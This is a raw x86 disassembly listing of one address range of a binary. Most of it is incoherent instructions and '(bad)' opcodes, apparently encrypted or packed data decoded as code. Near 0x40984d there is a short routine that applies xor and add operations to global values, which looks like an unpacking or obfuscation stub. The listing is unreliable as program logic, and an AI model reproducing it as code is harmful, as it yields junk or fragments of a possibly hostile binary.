  409516:	ret    0x9879
  409519:	es jno 0x4094e2
  40951c:	sbb    eax,0x9cf70488
  409521:	mov    ebp,0x657ed3c9
  409526:	mov    ecx,0xe971ddaa
  40952b:	pop    ecx
  40952c:	les    ebx,FWORD PTR [edx+0x42]
  40952f:	mov    ds:0x48a5f82f,al
  409534:	aas    
  409535:	test   DWORD PTR [eax+0xf2fc722],ebx
  40953b:	jne    0x4094c3
  40953d:	jmp    0x35f2:0xc52d88e9
  409544:	jne    0x4095a9
  409546:	jno    0x40953c
  409548:	rol    BYTE PTR [ecx+0x170a6bb6],cl
  40954e:	(bad)  
  409550:	sbb    eax,0x25b5ce1f
  409555:	pop    ss
  409556:	ins    DWORD PTR es:[edi],dx
  409557:	add    DWORD PTR ds:0x21c40f93,ecx
  40955d:	leave  
  40955e:	xor    ecx,DWORD PTR [edi+ecx*8+0x4d]
  409562:	jmp    0xd2b145ac
  409567:	sbb    al,0xdc
  409569:	loop   0x40950e
  40956b:	js     0x4095df
  40956d:	out    0xd0,eax
  40956f:	ror    ch,1
  409571:	icebp  
  409572:	jecxz  0x409587
  409574:	call   0xd4436f8c
  409579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40957a:	adc    edi,DWORD PTR [ecx-0x6f]
  40957d:	pushf  
  40957e:	inc    eax
  40957f:	cmp    esp,DWORD PTR [ecx]
  409581:	adc    al,0xcd
  409583:	jbe    0x409532
  409585:	sbb    dh,BYTE PTR [edx+0x3f]
  409588:	shl    DWORD PTR [edi-0x44fbc3de],0xf4
  40958f:	mov    ah,0xa0
  409591:	and    bh,ah
  409593:	cmp    al,0x27
  409595:	cmc    
  409596:	nop
  409597:	xchg   DWORD PTR [esp+ebp*8],ebp
  40959a:	add    bl,dh
  40959c:	pop    ds
  40959d:	sub    edx,DWORD PTR [ebx-0x522f5a00]
  4095a3:	sbb    DWORD PTR [esp+edi*1-0x3e95f4d],edi
  4095aa:	outs   dx,BYTE PTR ds:[esi]
  4095ab:	push   edi
  4095ac:	jmp    0xf248f1b2
  4095b1:	ins    BYTE PTR es:[edi],dx
  4095b2:	and    dh,cl
  4095b4:	adc    al,0x45
  4095b6:	sub    esi,DWORD PTR [ebp-0x67f30603]
  4095bc:	scas   eax,DWORD PTR es:[edi]
  4095bd:	add    DWORD PTR [edx-0x16],ebp
  4095c0:	jmp    0xb5d5:0x6ae2bde1
  4095c7:	xchg   ebx,eax
  4095c8:	sub    DWORD PTR [edi-0x21e3b488],ebx
  4095ce:	clc    
  4095cf:	mov    eax,ds:0x942320ca
  4095d4:	and    esi,0xffffff82
  4095d7:	(bad)  
  4095d8:	repz imul ebx,DWORD PTR [edi-0x6b],0x15857073
  4095e0:	or     DWORD PTR [ebx+edx*1-0x41689e2b],ebx
  4095e7:	xchg   DWORD PTR [ebx+edx*2-0x2adf18],ecx
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ef7:0x2173c4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	jmp    0xa3fd:0xac21e930
  409613:	push   ebx
  409614:	mov    dl,0x2
  409616:	jbe    0x4095a9
  409618:	in     al,0x33
  40961a:	inc    ecx
  40961b:	aam    0xe6
  40961d:	lsl    edi,WORD PTR [edi+0x2d3df4d5]
  409624:	rcr    DWORD PTR ds:0xa805facd,0xd2
  40962b:	retf   0xfc84
  40962e:	xlat   BYTE PTR ds:[ebx]
  40962f:	mov    bh,0xf4
  409631:	arpl   bp,si
  409633:	ficom  DWORD PTR ds:0x6c6bde86
  409639:	mov    cl,0xb3
  40963b:	pop    es
  40963c:	icebp  
  40963d:	inc    esp
  40963e:	adc    BYTE PTR [ebx-0x382759ee],bh
  409644:	jge    0x409636
  409646:	lods   al,BYTE PTR ds:[esi]
  409647:	jge    0x4096b0
  409649:	xor    ebp,DWORD PTR [ebp+0x7c329fd2]
  40964f:	ret    
  409650:	out    dx,eax
  409651:	in     eax,dx
  409652:	into   
  409653:	and    BYTE PTR ds:0x1313676e,bl
  409659:	test   cl,ah
  40965b:	popa   
  40965c:	sti    
  40965d:	clc    
  40965e:	scas   eax,DWORD PTR es:[edi]
  40965f:	in     al,0x2
  409661:	int3   
  409662:	out    0xed,eax
  409664:	lods   al,BYTE PTR ds:[esi]
  409665:	adc    BYTE PTR [esi-0x4f0485a],bh
  40966b:	(bad)  
  40966c:	mov    fs,WORD PTR [edi]
  40966e:	pop    esi
  40966f:	xor    al,0x9
  409671:	sub    esp,DWORD PTR [edx+0x201f97d5]
  409677:	cmp    DWORD PTR [ebp-0x35],0x28167ba8
  40967e:	(bad)  
  40967f:	aaa    
  409680:	push   ss
  409681:	retf   0x6f76
  409684:	outs   dx,DWORD PTR ds:[esi]
  409685:	(bad)  
  409687:	xlat   BYTE PTR ds:[ebx]
  409688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409689:	ja     0x409616
  40968b:	out    0x89,al
  40968d:	icebp  
  40968e:	jmp    0x35130994
  409693:	xlat   BYTE PTR ds:[ebx]
  409694:	mov    eax,ds:0xa0357d58
  409699:	pop    es
  40969a:	in     al,dx
  40969b:	lods   eax,DWORD PTR ds:[esi]
  40969c:	mov    ecx,0x970c01f6
  4096a1:	xchg   DWORD PTR [esi+eax*4-0x26563dd8],esp
  4096a8:	xchg   edx,eax
  4096a9:	stos   BYTE PTR es:[edi],al
  4096aa:	adc    BYTE PTR [edi+ecx*4],0xd9
  4096ae:	mov    ebp,DWORD PTR [eax]
  4096b0:	hlt    
  4096b1:	xchg   DWORD PTR [ecx+0x14462c76],esi
  4096b7:	inc    esi
  4096b8:	ror    edi,1
  4096ba:	push   edx
  4096bb:	ins    BYTE PTR es:[edi],dx
  4096bc:	fisub  DWORD PTR [bx]
  4096bf:	frstor [ebp+0x6ad98f51]
  4096c5:	mov    bl,0x1b
  4096c7:	pusha  
  4096c8:	fs dec edi
  4096cb:	repnz cmp eax,0x4cbacd95
  4096d1:	bound  eax,QWORD PTR [esi+0x11335131]
  4096d7:	or     eax,0x7fb4828d
  4096dc:	mov    dl,0x13
  4096de:	cmp    bh,BYTE PTR [eax-0x5f7148f1]
  4096e4:	adc    eax,0xc3ea1e8a
  4096e9:	das    
  4096ea:	not    BYTE PTR [edi-0x26cbf4c6]
  4096f0:	loopne 0x4096ef
  4096f2:	retf   0xa713
  4096f5:	(bad)  [ebp+eax*1+0x1e]
  4096f9:	dec    eax
  4096fa:	push   0x9d6bd021
  4096ff:	ds mov al,0x19
  409702:	sbb    edi,0xd178333d
  409708:	fimul  DWORD PTR [eax+esi*4-0x563a4dd]
  40970f:	cld    
  409710:	push   ds
  409711:	test   al,0x40
  409713:	mov    dl,bl
  409715:	cdq    
  409716:	mov    cl,0x38
  409718:	jl     0x409742
  40971a:	push   ebp
  40971b:	scas   eax,DWORD PTR es:[edi]
  40971c:	jo     0x409772
  40971e:	jmp    0xee0872ee
  409723:	adc    eax,0x1623d1c2
  409728:	enter  0x4a24,0x3e
  40972c:	sbb    ebp,DWORD PTR [ebp+eax*4-0x1d2c0ccc]
  409733:	shl    DWORD PTR [edx],0xc0
  409736:	add    ebp,DWORD PTR [ebx]
  409738:	pop    edi
  409739:	int3   
  40973a:	aad    0x5b
  40973c:	pushf  
  40973d:	pop    ss
  40973e:	jmp    0x4f7cd7ba
  409743:	xor    al,0xcf
  409745:	bound  ecx,QWORD PTR [ecx+0x7164baaf]
  40974b:	aaa    
  40974c:	test   DWORD PTR [ebx+0x61],edx
  40974f:	mov    ebx,0x19dc832d
  409754:	xchg   edi,eax
  409755:	mov    ch,BYTE PTR [esi]
  409757:	or     eax,0x73c1de1
  40975c:	cs pop edx
  40975e:	sub    eax,0xbcae6e9e
  409763:	repz pop edx
  409765:	aas    
  409766:	ficomp DWORD PTR [ebx+0x77]
  409769:	cmp    ecx,DWORD PTR [eax-0x161f8a72]
  40976f:	cmp    dh,dh
  409771:	dec    ebx
  409772:	xchg   edi,eax
  409773:	repnz mov eax,gs
  409776:	cmp    edi,edi
  409778:	jb     0x409796
  40977a:	xchg   ebx,eax
  40977b:	ret    
  40977c:	and    eax,0xcfde62ae
  409781:	mov    ebp,0xe3eb361d
  409786:	push   eax
  409787:	inc    eax
  409788:	adc    al,0xde
  40978a:	dec    edx
  40978b:	or     al,0xbb
  40978d:	loope  0x40974b
  40978f:	scas   eax,DWORD PTR es:[edi]
  409790:	ins    BYTE PTR es:[edi],dx
  409791:	mov    dh,0xbd
  409793:	or     al,0x80
  409795:	fnsave [ecx-0x54990711]
  40979b:	sub    al,BYTE PTR [ecx+0x42]
  40979e:	dec    edi
  40979f:	xor    edx,DWORD PTR [eax-0x58]
  4097a2:	out    dx,al
  4097a3:	add    eax,esi
  4097a5:	js     0x4097f6
  4097a7:	sbb    BYTE PTR [ebx],bh
  4097a9:	and    ebx,DWORD PTR [edi-0x61]
  4097ac:	sub    al,0x98
  4097ae:	mov    dh,0x8c
  4097b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b1:	out    dx,eax
  4097b2:	fild   QWORD PTR [esi-0x60]
  4097b5:	mov    ch,0xdd
  4097b7:	mov    ecx,0x53643f74
  4097bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097bd:	pusha  
  4097be:	cdq    
  4097bf:	dec    ebp
  4097c0:	ret    0x25e
  4097c3:	jmp    0xa333:0x73b7334a
  4097ca:	ins    BYTE PTR es:[edi],dx
  4097cb:	cld    
  4097cc:	and    eax,0x5f05c86c
  4097d1:	sbb    BYTE PTR [ebx+0x28],dh
  4097d4:	jb     0x4097b0
  4097d6:	jbe    0x409824
  4097d8:	cmp    DWORD PTR [ebp-0x76],ebp
  4097db:	iret   
  4097dc:	push   ecx
  4097dd:	mov    DWORD PTR [eax+0x4dd4023f],0x7a99e763
  4097e7:	cmp    al,0xdd
  4097e9:	push   edx
  4097ea:	dec    esi
  4097eb:	xchg   edx,eax
  4097ec:	push   eax
  4097ed:	jge    0x409806
  4097ef:	out    0x73,al
  4097f1:	ins    BYTE PTR es:[edi],dx
  4097f2:	shr    al,cl
  4097f4:	xchg   edi,eax
  4097f5:	jge    0x409824
  4097f7:	xlat   BYTE PTR ds:[ebx]
  4097f8:	mov    ds:0xf6ed0385,eax
  4097fd:	mov    ?,WORD PTR [eax-0x53]
  409800:	pop    ebx
  409801:	sbb    BYTE PTR [edx],dl
  409803:	xor    DWORD PTR [esi],edi
  409805:	jle    0x409811
  409807:	popf   
  409808:	cld    
  409809:	div    ecx
  40980b:	mov    bl,0x1a
  40980d:	sub    eax,0x5dc54fae
  409812:	hlt    
  409813:	test   dh,ch
  409815:	adc    ebp,DWORD PTR [ecx-0x7c1a1c3d]
  40981b:	test   BYTE PTR [ebx-0xe],dl
  40981e:	xchg   edi,eax
  40981f:	push   edi
  409820:	sub    al,0x8b
  409822:	cmp    al,0xbf
  409824:	sub    DWORD PTR [ebp-0x36],0x7e
  409828:	xchg   ebp,eax
  409829:	cmp    eax,0x4e1a15fb
  40982e:	inc    eax
  40982f:	and    DWORD PTR ds:0x79555678,ecx
  409835:	cmp    al,0x8b
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	mov    bl,BYTE PTR [ebx-0x6a]
  4098c3:	test   eax,0x7e7ed9b4
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	mov    eax,0x1ba2a3f0
  4098d1:	xor    BYTE PTR [ebx-0x70dd7990],dl
  4098d7:	inc    eax
  4098d8:	push   edi
  4098d9:	inc    ecx
  4098da:	aaa    
  4098db:	pop    ecx
  4098dc:	inc    ecx
  4098dd:	out    0x7,eax
  4098df:	or     al,0xae
  4098e1:	mov    bh,BYTE PTR [eax+0x2556364c]
  4098e7:	pop    edi
  4098e8:	je     0x40993d
  4098ea:	and    esp,edx
  4098ec:	jp     0x4098b0
  4098ee:	push   ebp
  4098ef:	pop    ds
  4098f0:	jl     0x4098d6
  4098f2:	pop    edi
  4098f3:	out    dx,eax
  4098f4:	sub    DWORD PTR [edx+0xa18ff1b],ecx
  4098fa:	hlt    
  4098fb:	push   es
  4098fc:	xchg   esp,eax
  4098fd:	cdq    
  4098fe:	add    bl,BYTE PTR [ecx-0x24dc47c2]
  409904:	jp     0x40997c
  409906:	cmp    edx,ebx
  409908:	mov    dh,0x55
  40990a:	add    al,0x7c
  40990c:	jecxz  0x4098c1
  40990e:	mov    ss,ecx
  409910:	repnz sub esi,DWORD PTR ds:0xa2e67501
  409917:	cli    
  409918:	dec    esi
  409919:	dec    eax
  40991a:	(bad)  
  40991b:	in     al,0x7c
  40991d:	jecxz  0x409910
  40991f:	sar    BYTE PTR [edi],1
  409921:	std    
  409922:	test   al,0x94
  409925:	cs mov bh,0x39
  409928:	addr16 push esp
  40992a:	xchg   esp,eax
  40992b:	cld    
  40992c:	or     eax,0xa271de72
  409931:	int3   
  409932:	push   ds
  409933:	xchg   BYTE PTR [edx+0x3c77da97],dh
  409939:	pushf  
  40993a:	inc    ebp
  40993b:	pop    esi
  40993c:	mov    dh,0x39
  40993e:	outs   dx,BYTE PTR ds:[esi]
  40993f:	inc    esp
  409940:	cmp    DWORD PTR [ecx+0x345d52d6],ebp
  409946:	push   gs
  409948:	jecxz  0x4098d1
  40994a:	(bad)  
  40994b:	and    edx,ecx
  40994d:	icebp  
  40994e:	aas    
  40994f:	add    al,0x39
  409951:	in     al,dx
  409952:	out    dx,eax
  409953:	(bad)  
  409955:	or     edi,DWORD PTR ds:0x955f833e
  40995b:	mov    esp,0xa60248ca
  409960:	push   esp
  409961:	mov    cl,BYTE PTR [ecx-0x4c]
  409964:	out    0x29,eax
  409966:	test   eax,0x9438254f
  40996b:	ja     0x40994f
  40996d:	mov    ecx,gs
  40996f:	pop    esp
  409970:	mul    dl
  409972:	sbb    eax,0xbc350dd
  409977:	imul   edx,DWORD PTR [esi+0x72b459d8],0x1cb3669e
  409981:	jae    0x40992c
  409983:	sbb    al,0xa
  409985:	inc    eax
  409986:	lds    edx,FWORD PTR [eax-0x2546abb1]
  40998c:	lea    ebp,[edx]
  40998e:	lds    ebx,FWORD PTR [edx]
  409990:	ins    BYTE PTR es:[edi],dx
  409991:	or     eax,0xd085caed
  409996:	mov    ?,WORD PTR [ecx+0x45]
  409999:	dec    edi
  40999a:	int3   
  40999b:	pop    ecx
  40999c:	push   0xffffff98
  40999e:	jns    0x4099df
  4099a0:	mov    ebp,0x6f3f57c4
  4099a5:	and    BYTE PTR [esi],0x80
  4099a8:	pop    edx
  4099a9:	cld    
  4099aa:	icebp  
  4099ab:	dec    ebp
  4099ac:	repnz sahf 
  4099ae:	das    
  4099af:	sbb    dl,BYTE PTR [esi-0x54]
  4099b2:	shl    BYTE PTR [edx+0x4a706d15],cl
  4099b8:	sbb    DWORD PTR [eax],ecx
  4099ba:	call   FWORD PTR [edi-0x97f9d08]
  4099c0:	sbb    edx,DWORD PTR [ebp+edx*8+0x43]
  4099c4:	bound  esp,QWORD PTR [esi+0x75]
  4099c7:	ja     0x409990
  4099c9:	add    BYTE PTR [esi+0x48],dl
  4099cc:	jle    0x4099fa
  4099ce:	lods   eax,DWORD PTR ds:[esi]
  4099cf:	aaa    
  4099d0:	jge    0x4099a6
  4099d2:	lods   al,BYTE PTR ds:[esi]
  4099d3:	sub    ebp,DWORD PTR ds:0x379b6559
  4099d9:	push   ds
  4099da:	int3   
  4099db:	jge    0x4099c6
  4099dd:	ret    0xfcd5
  4099e0:	cmp    BYTE PTR [edi-0x797f1833],dh
  4099e6:	dec    ecx
  4099e7:	sahf   
  4099e8:	sbb    eax,0x5dbf4c05
  4099ed:	jns    0x40999b
  4099ef:	lds    esi,FWORD PTR [ebp+0x14]
  4099f2:	add    ah,BYTE PTR [ecx*2-0x7f03761d]
  4099f9:	mov    bl,0x53
  4099fb:	cmp    eax,0x70b2e02c
  409a00:	ins    DWORD PTR es:[edi],dx
  409a01:	xchg   ebp,eax
  409a02:	cmp    esi,DWORD PTR [edi-0x58]
  409a05:	xor    al,0x13
  409a07:	adc    dl,cl
  409a09:	or     al,0x63
  409a0b:	mov    esi,0xbba3b78c
  409a10:	and    BYTE PTR [ecx],ah
  409a12:	stos   DWORD PTR es:[edi],eax
  409a13:	cdq    
  409a14:	lds    ecx,FWORD PTR [ecx-0x3e5476ad]
  409a1a:	mov    ecx,0x282fc5c1
  409a1f:	std    
  409a20:	push   ebp
  409a21:	adc    eax,eax
  409a23:	mov    eax,ds:0x89c71ebb
  409a28:	popa   
  409a29:	popf   
  409a2a:	lahf   
  409a2b:	int3   
  409a2c:	sbb    DWORD PTR [esp+ebx*1-0x6fddd9c6],eax
  409a33:	or     ebx,edx
  409a35:	cs push eax
  409a37:	retf   0xfbe0
  409a3a:	jecxz  0x4099c8
  409a3c:	sub    eax,0x93d6a156
  409a41:	mov    WORD PTR [edi+0x3ecefa2d],ss
  409a47:	hlt    
  409a48:	jmp    0xc3c3e195
  409a4d:	mov    edx,0x1f6b282d
  409a52:	push   ds
  409a53:	aam    0xf0
  409a55:	gs pop ecx
  409a57:	mov    esi,edi
  409a59:	js     0x409a34
  409a5b:	loop   0x409a96
  409a5d:	dec    esi
  409a5e:	sbb    DWORD PTR [eax-0x58],esp
  409a61:	push   0xffffffe7
  409a63:	sbb    bh,BYTE PTR [edx]
  409a65:	cmp    ebx,DWORD PTR [esi]
  409a67:	inc    edx
  409a68:	mov    BYTE PTR [ebp-0x53],bl
  409a6b:	repz (bad) 
  409a6e:	lods   al,BYTE PTR ds:[esi]
  409a6f:	leave  
  409a70:	cld    
  409a71:	ins    DWORD PTR es:[edi],dx
  409a72:	sbb    DWORD PTR [ebx-0x198df45],eax
  409a78:	xchg   esp,eax
  409a79:	lods   al,BYTE PTR ds:[esi]
  409a7a:	mov    al,ds:0x3627d10b
  409a7f:	test   BYTE PTR [ecx+0x53],al
  409a82:	scas   al,BYTE PTR es:[edi]
  409a83:	lods   al,BYTE PTR ds:[esi]
  409a84:	push   ss
  409a85:	push   ebp
  409a86:	shl    ecx,cl
  409a88:	into   
  409a89:	mov    bl,0xb0
  409a8b:	xor    dl,BYTE PTR [ebx-0x6cfd171e]
  409a91:	call   0x9b854afb
  409a96:	mov    eax,0xeb6978f1
  409a9b:	add    ebp,eax
  409a9d:	sti    
  409a9e:	push   es
  409a9f:	fcmovne st,st(4)
  409aa1:	repz cmp cl,BYTE PTR [ebx]
  409aa4:	push   ebx
  409aa5:	cs ins DWORD PTR es:[edi],dx
  409aa7:	rcr    eax,0xa7
  409aaa:	xchg   ebx,eax
  409aab:	add    dh,BYTE PTR [esi-0x1d]
  409aae:	ins    DWORD PTR es:[edi],dx
  409aaf:	nop
  409ab0:	(bad)  
  409ab1:	push   ecx
  409ab2:	fmul   DWORD PTR [esi+0x7d741437]
  409ab8:	or     al,0x7
  409aba:	icebp  
  409abb:	fldenv [edx-0x93b45b0]
  409ac1:	jmp    0x409ae1
  409ac3:	imul   DWORD PTR [edi-0x500a1f9f]
  409ac9:	aam    0xcc
  409acb:	in     al,dx
  409acc:	test   BYTE PTR [edx+0x4ded8876],dh
  409ad2:	fidivr DWORD PTR [ebx+edi*1-0x44685205]
  409ad9:	(bad)  
  409ada:	or     edx,ecx
  409adc:	enter  0x8205,0x27
  409ae0:	xchg   ebp,eax
  409ae1:	imul   edx,DWORD PTR [ecx],0xffffffe8
  409ae4:	ja     0x409ac5
  409ae6:	inc    esp
  409ae7:	mov    dh,0x1f
  409ae9:	xor    esp,eax
  409aeb:	mov    ch,0x98
  409aed:	jnp    0x409b20
  409aef:	sbb    esi,ecx
  409af1:	jne    0x409b71
  409af3:	je     0x409b46
  409af5:	jl     0x409b66
  409af7:	mov    al,ds:0xd2eecbfa
  409afc:	push   eax
  409afd:	pop    ebx
  409afe:	(bad)  
  409aff:	(bad)  
  409b00:	mov    al,0xf3
  409b02:	cld    
  409b03:	(bad)  
  409b04:	push   ebp
  409b05:	push   0xffffffe4
  409b07:	xchg   ecx,eax
  409b08:	jne    0x409b2c
  409b0a:	mov    cl,ch
  409b0c:	ret    0x11a
  409b0f:	xor    BYTE PTR [ebp-0x7ea8a99e],bh
  409b15:	sbb    eax,0x43369f
  409b1a:	push   ebx
  409b1b:	ss inc ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x6205c82c]
  409b32:	cmp    bh,BYTE PTR [esi-0x1c]
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	and    ebx,DWORD PTR [ecx+0x501fd28a]
  409b41:	jmp    0x3176:0xf7e830ed
  409b48:	int    0x63
  409b4a:	stos   BYTE PTR es:[edi],al
  409b4b:	jge    0x409add
  409b4d:	repz bound ebx,QWORD PTR [ecx+esi*1+0x1fa14a5]
  409b55:	add    esi,DWORD PTR [edi+0x62256432]
  409b5b:	xchg   ebx,edi
  409b5d:	fwait
  409b5e:	out    0x8d,eax
  409b60:	scas   eax,DWORD PTR es:[edi]
  409b61:	push   eax
  409b62:	(bad)  
  409b63:	outs   dx,DWORD PTR ds:[esi]
  409b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b65:	loopne 0x409b5b
  409b67:	cdq    
  409b68:	call   0x278383f8
  409b6d:	push   ss
  409b6e:	or     ch,BYTE PTR [ecx-0x37c5da94]
  409b74:	add    al,0x2f
  409b76:	mov    edi,0x1063ff66
  409b7b:	or     ch,BYTE PTR [esi+0x30]
  409b7e:	sbb    esp,DWORD PTR [eax+0x69]
  409b81:	mov    al,0x2c
  409b83:	push   ds
  409b84:	cmp    eax,0xd8570a22
  409b89:	test   DWORD PTR [esi-0x5059f8ca],0xc295c02d
  409b93:	xchg   ah,dl
  409b95:	cmp    esp,DWORD PTR [esi+0x44]
  409b98:	jecxz  0x409c15
  409b9a:	inc    esp
  409b9b:	jl     0x409b49
  409b9d:	jl     0x409b9f
  409b9f:	shl    DWORD PTR [ebp-0xc4b45a0],1
  409ba5:	loop   0x409b4b
  409ba7:	cmc    
  409ba8:	mov    cs,WORD PTR [edi-0x48]
  409bab:	and    al,0x2b
  409bad:	je     0x409be3
  409baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb0:	xor    dh,bl
  409bb2:	lea    esi,[ecx+0xd]
  409bb5:	jb     0x409b39
  409bb7:	mov    bh,0x38
  409bb9:	jo     0x409b75
  409bbb:	mov    DWORD PTR [ebp-0x7c],edx
  409bbe:	and    edi,DWORD PTR [ebx+edi*2-0x6e]
  409bc2:	pop    edx
  409bc3:	cmc    
  409bc4:	out    dx,eax
  409bc5:	sub    esp,0xffffffa8
  409bc8:	aam    0x10
  409bca:	fsubr  QWORD PTR [ebx+0x783c1f47]
  409bd0:	into   
  409bd1:	les    esi,FWORD PTR [ebx-0xb]
  409bd4:	test   eax,0xf73ec0f4
  409bd9:	sub    eax,0x147ad40d
  409bde:	and    eax,0xe65a900b
  409be3:	push   ebp
  409be4:	repz enter 0x337,0x8e
  409be9:	ja     0x409ba3
  409beb:	jns    0x409c27
  409bed:	xchg   cl,bl
  409bef:	imul   edx,DWORD PTR [edx-0x5a50f31f],0x6
  409bf6:	aad    0xec
  409bf8:	jle    0x409bcf
  409bfa:	add    ecx,DWORD PTR [edi]
  409bfc:	mov    ah,0x7a
  409bfe:	sbb    al,0x78
  409c00:	sub    edi,DWORD PTR [eax]
  409c02:	(bad)  
  409c03:	xor    al,0x3b
  409c05:	ins    DWORD PTR es:[edi],dx
  409c06:	mov    ecx,0xacddbc20
  409c0b:	push   esi
  409c0c:	mov    bl,0x7f
  409c0e:	mov    ecx,0x3cd0ea25
  409c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c14:	jno    0x409c05
  409c16:	or     al,0x6b
  409c18:	fild   DWORD PTR [esi+0x2fac3704]
  409c1e:	adc    bl,BYTE PTR es:[eax-0x11]
  409c22:	dec    esi
  409c23:	push   edx
  409c24:	inc    esp
  409c25:	ret    
  409c26:	push   ebx
  409c27:	cli    
  409c28:	inc    edi
  409c29:	enter  0x3316,0xfa
  409c2d:	enter  0x1797,0xe3
  409c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c32:	stc    
  409c33:	arpl   WORD PTR [ebx+0xfecd2ad],di
  409c39:	ror    BYTE PTR [edi-0x11f3dce0],1
  409c3f:	pop    es
  409c40:	fmul   QWORD PTR [eax-0x10]
  409c43:	cmovs  ebx,esi
  409c46:	mov    ds:0xc72786f2,al
  409c4b:	(bad)  
  409c4c:	das    
  409c4d:	add    eax,0x99687c6a
  409c52:	cmc    
  409c53:	lods   al,BYTE PTR ds:[esi]
  409c54:	sahf   
  409c55:	loop   0x409c46
  409c57:	test   eax,0x1cbed083
  409c5c:	ja     0x409cc3
  409c5e:	add    bh,BYTE PTR [esi+ebp*2-0x38]
  409c62:	clc    
  409c63:	pushf  
  409c64:	sbb    eax,DWORD PTR [esi]
  409c66:	or     esi,edi
  409c68:	push   ds
  409c69:	add    DWORD PTR [edx-0x48bdb80b],0x8714190c
  409c73:	lahf   
  409c74:	cmp    BYTE PTR [ecx+eiz*4+0x5125da11],ch
  409c7b:	mov    esi,0xabb51883
  409c80:	add    al,0xd2
  409c82:	mov    ch,0xb1
  409c84:	and    eax,DWORD PTR [ecx-0x66d27bd]
  409c8a:	add    dl,BYTE PTR [edi]
  409c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c8d:	hlt    
  409c8e:	clc    
  409c8f:	out    dx,al
  409c90:	jecxz  0x409c70
  409c92:	out    dx,eax
  409c93:	fisttp DWORD PTR [edx]
  409c95:	in     al,dx
  409c96:	mov    dl,0xd
  409c99:	cwde   
  409c9a:	pop    esi
  409c9b:	xor    edx,DWORD PTR [eax+0x5a8899df]
  409ca1:	and    DWORD PTR [ecx+0x58b3b946],eax
  409ca7:	std    
  409ca8:	cmp    al,0xfc
  409caa:	aad    0x5e
  409cac:	lods   al,BYTE PTR ds:[esi]
  409cad:	adc    al,0x68
  409cb0:	lahf   
  409cb1:	mov    DWORD PTR [eax+ebp*8-0x3d],edx
  409cb5:	imul   ebx,DWORD PTR [ecx],0x64
  409cb8:	sub    al,0x7b
  409cba:	mov    edx,0xb43ee943
  409cc0:	mov    esi,0x4803f73e
  409cc5:	and    ebp,DWORD PTR [eax]
  409cc7:	sti    
  409cc8:	jae    0x409cce
  409cca:	in     al,dx
  409ccb:	xor    al,0x9b
  409ccd:	cmp    eax,ebx
  409ccf:	xor    DWORD PTR [edi+0x45eddd34],esi
  409cd5:	sbb    eax,0x1663b37e
  409cda:	bnd js 0x409d39
  409cdd:	(bad)  
  409cdf:	or     al,BYTE PTR [edi]
  409ce1:	mov    esi,0x53d8bc65
  409ce6:	adc    al,0xad
  409ce8:	add    DWORD PTR [ebx],ecx
  409cea:	sub    bl,BYTE PTR [edx+eiz*2+0x73]
  409cee:	jb     0x409ca9
  409cf0:	push   ss
  409cf1:	and    BYTE PTR [esi-0x1b],ch
  409cf4:	aaa    
  409cf5:	adc    eax,0x7fa77c5
  409cfa:	mov    esi,0xa3fb3a05
  409cff:	or     BYTE PTR [esi-0x35],0x74
  409d03:	and    eax,0x9fafa426
  409d08:	jg     0x409d25
  409d0a:	dec    ebp
  409d0b:	adc    dl,BYTE PTR [edi-0x4c]
  409d0e:	jno    0x409d1c
  409d10:	mov    BYTE PTR [edx],dh
  409d12:	pop    esp
  409d13:	(bad)  
  409d14:	and    eax,DWORD PTR [eax+0x7]
  409d17:	adc    eax,0xd0d95433
  409d1c:	std    
  409d1d:	sub    BYTE PTR ss:[edi-0xb],bh
  409d21:	or     DWORD PTR [esi],eax
  409d23:	fldcw  WORD PTR ds:0xb59945d5
  409d29:	sti    
  409d2a:	inc    esi
